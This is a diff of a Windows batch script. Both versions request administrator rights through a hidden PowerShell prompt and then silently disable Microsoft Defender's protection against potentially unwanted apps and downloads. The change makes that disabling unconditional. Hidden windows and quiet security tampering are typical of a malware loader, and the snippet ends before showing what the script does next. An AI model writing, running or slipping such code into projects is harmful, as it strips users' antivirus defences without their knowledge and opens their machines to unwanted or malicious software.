@@ -1,20 +1,14 @@
 @echo off
 
-:: Check the current PUA protection status
-for /f "tokens=2 delims=:" %%A in ('powershell -Command "(Get-MpPreference).PUAProtection"') do set "PUAStatus=%%A"
-set "PUAStatus=%PUAStatus: =%"
-
-:: If either "Block apps" or "Block downloads" is enabled (PUAProtection is not 0), proceed with administrative access request
-if not "%PUAStatus%"=="0" (
-    net session >nul 2>&1
-    if %errorLevel% NEQ 0 (
-        powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
-        exit /b
-    )
-
-    :: Disable PUA protection (turn off "Block apps" and "Block downloads")
-    powershell -WindowStyle Hidden -Command "Set-MpPreference -PUAProtection 0"
+:: Request administrative privileges if not already running as admin
+net session >nul 2>&1
+if %errorLevel% NEQ 0 (
+    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
+    exit /b
 )
+
+:: Always disable PUA protection (turn off "Block apps" and "Block downloads")
+powershell -WindowStyle Hidden -Command "Set-MpPreference -PUAProtection 0"
 
 :: Change directory to the script location
 cd /d "%~dp0"
